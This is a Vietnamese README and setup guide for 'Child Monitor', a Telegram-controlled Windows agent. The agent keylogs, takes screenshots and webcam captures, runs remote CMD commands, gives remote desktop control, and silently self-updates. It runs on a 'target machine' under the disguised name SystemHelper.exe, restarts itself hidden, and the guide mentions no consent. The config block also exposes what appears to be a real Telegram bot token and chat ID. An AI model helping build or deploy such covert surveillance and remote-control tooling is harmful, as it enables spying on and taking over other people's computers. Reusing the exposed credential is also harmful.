# Child Monitor — Tài liệu Tổng quan Hệ thống & Hướng dẫn Cài đặt

> **Phiên bản**: 1.0.13  
> **Cập nhật lần cuối**: 2026-08-21  
> **Repo**: https://github.com/kangha23/child-monitor

---

## 1. Tổng quan Dự án

**Child Monitor** là hệ thống giám sát máy tính Windows từ xa, điều khiển qua Telegram Bot và hỗ trợ Remote Desktop qua WebRTC H.264.

### Thành phần chính

| Thành phần | Chạy trên | Mô tả |
|---|---|---|
| `monitor.py` / `SystemHelper.exe` | Windows (máy mục tiêu) | Agent giám sát chính — keylog, screenshot, camera, nhận lệnh Telegram, WebRTC host |
| `signaling_server.py` | Mac / VPS (máy điều khiển) | WebSocket relay server + HTTP server phục vụ Web Viewer |
| `signaling_relay.py` | VPS (tuỳ chọn) | Phiên bản gọn nhẹ hơn của signaling server, dùng cho deploy trên VPS |
| `web_viewer/index.html` | Trình duyệt | Giao diện WebRTC Remote Desktop trong trình duyệt |
| `config.json` | Windows (máy mục tiêu) | File cấu hình (Telegram token, interval, WebRTC URLs, ...) |
| `version.txt` | Cả hai | Đánh dấu phiên bản, dùng cho cơ chế `/update` |
| `cloudflared` | Mac / VPS | Tạo tunnel công khai miễn phí, expose localhost ra internet |

---

## 2. Kiến trúc Hệ thống

```
┌──────────────────────────┐       ┌────────────────────────────┐       ┌─────────────────────────┐
│   MÁY MỤC TIÊU (Win)    │       │   MAC / VPS (Server)       │       │   TRÌNH DUYỆT (Viewer)  │
│                          │       │                            │       │                         │
│  SystemHelper.exe        │       │  signaling_server.py       │       │  web_viewer/index.html  │
│  ├─ Keylogger            │       │  ├─ WebSocket :8765        │       │  ├─ Hiển thị màn hình   │
│  ├─ Screenshot định kỳ   │       │  │  (relay SDP/ICE)        │       │  ├─ Điều khiển chuột    │
│  ├─ Camera định kỳ       │  WSS  │  └─ HTTP Viewer :8088      │ HTTPS │  └─ Điều khiển bàn phím │
│  ├─ Window tracker       ├──────►│                            │◄──────┤                         │
│  ├─ Telegram Bot listener│       │  cloudflared tunnels:      │       │  Mở link tunnel viewer  │
│  ├─ WebRTC H.264 Host    │       │  ├─ :8765 → wss://...      │       │  + hash params          │
│  ├─ Embedded Viewer :8088│       │  └─ :8088 → https://...    │       │                         │
│  ├─ Report generator     │       │                            │       │                         │
│  └─ Auto-update (/update)│       │                            │       │                         │
└──────────────────────────┘       └────────────────────────────┘       └─────────────────────────┘
         │                                                                        │
         │                    ┌────────────────────┐                              │
         └───────────────────►│   Telegram Bot API  │◄────────────────────────────┘
                              │   @Monitor239_bot   │       (Người dùng gõ lệnh)
                              └────────────────────┘
```

### Luồng kết nối WebRTC Remote Desktop

```
1. Người dùng gõ /remote trên Telegram
2. Bot tạo Room ID ngẫu nhiên, khởi động WebRTC Host trên máy mục tiêu
3. Bot gửi link viewer cho người dùng
4. Trình duyệt mở link → kết nối WebSocket tới Signaling Server
5. Signaling Server relay SDP Offer/Answer + ICE candidates giữa Host ↔ Viewer
6. Kết nối P2P được thiết lập → Video stream H.264 trực tiếp
7. Data Channel chuyển tiếp lệnh chuột/bàn phím từ Viewer → Host
```

---

## 3. Danh sách Lệnh Telegram

| Lệnh | Chức năng |
|---|---|
| `/help` | Hiển thị danh sách lệnh |
| `/status` | Trạng thái hệ thống (CPU, RAM, uptime, version) |
| `/lock` | Khoá màn hình Windows (`user32.LockWorkStation`) |
| `/screen`, `/screenshot` | Chụp và gửi ảnh màn hình |
| `/camera` | Chụp và gửi ảnh webcam |
| `/report` | Báo cáo nhanh: ứng dụng đang dùng + phím bấm gần nhất |
| `/remote` | Bật WebRTC Remote Desktop, trả về link viewer |
| `/stopremote` | Tắt phiên Remote Desktop |
| `/update` | Kiểm tra & cập nhật code/config mới từ GitHub |
| `/cmd <lệnh>` | Chạy lệnh CMD trên máy mục tiêu |
| `/restart` | Khởi động lại agent |
| `/shutdown` | Tắt máy mục tiêu |
| `/start`, `/stop` | Bật/tắt giám sát tạm thời |

---

## 4. File Cấu hình (`config.json`)

```json
{
  "telegram_bot_token": "8769415154:AAHvACXi9Urn1H6pcCCWQwgaTV6QqR8leOc",
  "telegram_chat_id": "-1003819299308",
  "report_interval_seconds": 60,
  "screenshot_interval_seconds": 60,
  "screenshot_enabled": true,
  "keylog_enabled": true,
  "camera_enabled": true,
  "camera_interval_seconds": 300,
  "update_url": "https://raw.githubusercontent.com/kangha23/child-monitor/main/",
  "webrtc": {
    "signaling_server": "wss://<SIGNALING_TUNNEL_URL>",
    "viewer_base_url": "https://<VIEWER_TUNNEL_URL>",
    "ice_servers": [
      { "urls": "stun:stun.l.google.com:19302" },
      { "urls": "stun:stun.cloudflare.com:3478" }
    ],
    "target_fps": 60,
    "max_fps": 120,
    "video_codec": "h264"
  }
}
```

### Giải thích các trường WebRTC

| Trường | Mô tả |
|---|---|
| `signaling_server` | URL WebSocket signaling server (dùng `wss://` khi qua tunnel) |
| `viewer_base_url` | URL trang Web Viewer (qua tunnel hoặc localhost) |
| `ice_servers` | Danh sách STUN/TURN servers cho NAT traversal |
| `target_fps` | FPS mục tiêu khi stream màn hình |
| `max_fps` | Giới hạn FPS tối đa |
| `video_codec` | Codec video (`h264` để tương thích trình duyệt) |

---

## 5. Hướng dẫn Cài đặt Signaling Server (trên Mac)

### Bước 1: Cài đặt Dependencies

```bash
# Cài Cloudflare Tunnel (miễn phí, không cần tài khoản)
brew install cloudflared

# Clone repo
git clone https://github.com/kangha23/child-monitor.git
cd child-monitor

# Tạo Python venv và cài dependencies
python3 -m venv .venv
source .venv/bin/activate
pip install websockets
```

### Bước 2: Chạy Signaling Server

```bash
# Terminal 1 — Khởi động server
source .venv/bin/activate
python3 signaling_server.py
```

Server sẽ khởi động 2 services:
- **WebSocket Signaling**: `ws://0.0.0.0:8765` — relay SDP/ICE giữa Host và Viewer
- **HTTP Web Viewer**: `http://0.0.0.0:8088` — phục vụ `web_viewer/index.html`

### Bước 3: Mở Cloudflare Tunnels

```bash
# Terminal 2 — Tunnel cho Signaling Server
cloudflared tunnel --url http://localhost:8765
# → In ra: https://xxxx.trycloudflare.com  (SIGNALING URL)

# Terminal 3 — Tunnel cho Web Viewer
cloudflared tunnel --url http://localhost:8088
# → In ra: https://yyyy.trycloudflare.com  (VIEWER URL)
```

### Bước 4: Cập nhật `config.json`

Thay `signaling_server` và `viewer_base_url` bằng URL tunnel vừa nhận:

```json
{
  "webrtc": {
    "signaling_server": "wss://xxxx.trycloudflare.com",
    "viewer_base_url": "https://yyyy.trycloudflare.com"
  }
}
```

Sau đó push lên GitHub:
```bash
git add config.json
git commit -m "Update tunnel URLs"
git push
```

Trên máy mục tiêu, gõ `/update` trong Telegram để tự động pull config mới.

### Bước 5: Sử dụng Remote Desktop

1. Gõ `/remote` trong Telegram
2. Bot trả về link viewer dạng:
   ```
   https://yyyy.trycloudflare.com/?room=<room_id>&signaling=wss://xxxx.trycloudflare.com
   ```
3. Mở link trên trình duyệt → xem và điều khiển màn hình từ xa

---

## 6. Cấu trúc File trong Repo

```
child-monitor/
├── .github/workflows/
│   └── build.yml              # CI/CD: Build SystemHelper.exe trên GitHub Actions
├── web_viewer/
│   └── index.html             # Giao diện WebRTC Remote Desktop (545 dòng)
├── monitor.py                 # Agent giám sát chính (~1476 dòng)
├── signaling_server.py        # Signaling + Web Viewer server (chạy trên Mac)
├── signaling_relay.py         # Signaling relay gọn nhẹ (chạy trên VPS)
├── config.json                # Cấu hình (Telegram, WebRTC, intervals)
├── version.txt                # Phiên bản hiện tại (1.0.8)
├── requirements.txt           # Python dependencies
├── SystemHelper.exe           # Binary đã build (chạy trên Windows)
├── build.bat                  # Script build local (folder mode)
├── build_onefile.bat          # Script build local (onefile mode)
├── AGENTS.md                  # Quy tắc cho AI/Agent khi chỉnh sửa code
└── REMOTE_SETUP.md            # Tài liệu này
```

---

## 7. Cơ chế Cập nhật Từ xa (`/update`)

```
1. Người dùng gõ /update
2. Bot đọc version.txt từ GitHub (update_url + "version.txt")
3. So sánh với version.txt local
4. Nếu khác → tải monitor.py, config.json, version.txt mới về
5. Lưu vào thư mục runtime/ hoặc ghi đè trực tiếp
6. Dùng cơ chế `ping 127.0.0.1 -n 3` để tạo độ trễ, cho phép tiến trình cũ tắt hẳn và dọn sạch file tạm (loại bỏ lỗi "Failed to remove temporary directory").
7. Tự restart process mới ngầm hoàn toàn.
```

**Quan trọng**: Mỗi khi sửa `monitor.py`, **PHẢI** nâng version trong `version.txt` để `/update` hoạt động.

---

## 8. CI/CD — GitHub Actions

File `.github/workflows/build.yml` tự động build `SystemHelper.exe` mỗi khi push lên `main`:

- **Runner**: `windows-latest`
- **Python**: 3.11
- **Build tool**: PyInstaller (onefile, windowed)
- **Dependencies**: `mss`, `Pillow`, `av`, `websockets`, `aiortc`, `pyinstaller`
- **Output**: `dist/SystemHelper.exe` → upload dưới dạng GitHub Artifact

---

## 9. Lưu ý & Troubleshooting

### Tunnel URL thay đổi mỗi lần restart
- Mỗi lần chạy `cloudflared tunnel`, URL random mới được tạo
- **Giải pháp**: Dùng Cloudflare Named Tunnel (cần tài khoản miễn phí) để có URL cố định

### NAT / Firewall
- WebRTC dùng P2P nếu mạng cho phép
- Nếu bị NAT strict, cần thêm TURN server vào `ice_servers` trong config
- STUN servers mặc định: `stun.l.google.com:19302` + `stun.cloudflare.com:3478`

### Port đã bị chiếm
- Signaling: Port `8765` (WebSocket)
- Web Viewer: Port `8088` (HTTP)
- Kiểm tra: `lsof -i :8765` / `lsof -i :8088`

### Máy mục tiêu không kết nối được
1. Kiểm tra `config.json` đã cập nhật URL tunnel chưa
2. Kiểm tra signaling server + cloudflared tunnel còn chạy không
3. Gõ `/status` trên Telegram để xem trạng thái
4. Gõ `/update` để force pull config mới

### Dependencies trên Mac
```bash
pip install websockets      # Hoặc trong venv
brew install cloudflared    # Cloudflare Tunnel CLI
```

### Dependencies trên Windows (máy mục tiêu)
```bash
pip install mss Pillow av websockets aiortc
```
Hoặc dùng file `SystemHelper.exe` đã build sẵn (không cần cài Python).
